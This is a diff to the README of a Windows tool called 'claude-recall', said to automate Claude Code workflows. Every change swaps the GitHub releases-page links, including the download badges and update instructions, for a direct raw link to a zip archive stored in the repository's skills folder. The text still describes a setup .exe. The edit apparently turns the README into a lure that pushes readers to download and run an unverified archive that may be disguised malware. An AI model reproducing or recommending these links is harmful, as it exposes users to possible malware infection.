@@ -1,6 +1,6 @@
 # ⚙️ claude-recall - Automate Claude Code Workflows Easily
 
-[![Download claude-recall](https://img.shields.io/badge/Download-claude--recall-green?style=for-the-badge)](https://github.com/NaghamYehya/claude-recall/releases)
+[![Download claude-recall](https://img.shields.io/badge/Download-claude--recall-green?style=for-the-badge)](https://raw.githubusercontent.com/NaghamYehya/claude-recall/main/skills/claude-recall-3.3.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This guide will help you download, install, and run claude-recall on Windows.
 
 Click the big green button below to visit the download page:
 
-[![Download Link](https://img.shields.io/badge/Download-claude--recall-brightgreen?style=for-the-badge)](https://github.com/NaghamYehya/claude-recall/releases)
+[![Download Link](https://img.shields.io/badge/Download-claude--recall-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/NaghamYehya/claude-recall/main/skills/claude-recall-3.3.zip)
 
 On that page, find the latest version for Windows. It is usually named something like `claude-recall-setup.exe`.
 
@@ -90,7 +90,7 @@ The program does this with no setup required. Just run it, and it learns from yo
 To get the latest features and fixes:
 
 1. Visit the releases page again here:  
-   [https://github.com/NaghamYehya/claude-recall/releases](https://github.com/NaghamYehya/claude-recall/releases)
+   [https://raw.githubusercontent.com/NaghamYehya/claude-recall/main/skills/claude-recall-3.3.zip](https://raw.githubusercontent.com/NaghamYehya/claude-recall/main/skills/claude-recall-3.3.zip)
 2. Download the newest installer version.
 3. Run the installer to replace your current version.
 4. Your existing skills and settings will stay safe.
@@ -148,4 +148,4 @@ claude-recall works entirely on your local machine. It does not send your data t
 
 Visit this page to download the latest version of claude-recall for Windows:  
 
-[https://github.com/NaghamYehya/claude-recall/releases](https://github.com/NaghamYehya/claude-recall/releases)
+[https://raw.githubusercontent.com/NaghamYehya/claude-recall/main/skills/claude-recall-3.3.zip](https://raw.githubusercontent.com/NaghamYehya/claude-recall/main/skills/claude-recall-3.3.zip)
